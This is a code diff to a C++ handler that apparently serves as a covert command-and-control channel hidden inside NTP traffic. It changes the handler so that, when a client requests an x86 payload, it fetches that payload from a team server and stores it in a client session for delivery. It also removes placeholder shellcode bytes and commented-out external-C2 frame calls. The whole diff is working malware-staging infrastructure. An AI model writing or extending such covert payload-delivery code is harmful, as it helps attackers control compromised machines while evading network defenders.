@@ -82,25 +82,15 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         }
 
         //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
-        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl;  // prints 86
+        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl <<std::dec;  // prints arch
 
         if (payloadArch == 0x86) {
             std::cout << "[?] X86 Payload Requested " << std::endl;
 
-
-            /*
-            send_frame(socket_extc2, "arch=x86", 8);
-	        send_frame(socket_extc2, "pipename=foobar", 15);
-	        send_frame(socket_extc2, "block=100", 9);
-            
-            //get frames back, laod into client class
-            */
-
-            //pretend the server sent this
-            //std::vector<uint8_t> tempPayload = { 0x90,0x90,0xCC,0xC3 };
+            //1. Get paylaod form TS
             std::vector<uint8_t> payload = getx86Payload();
 
-            //create or access client class:
+            //create or access client class - currnetly only creates
             ClientSession someClient(sessionId);
             someClient.setForClientBuffer(payload);
             std::cout << "[?] Stored payload in client class";
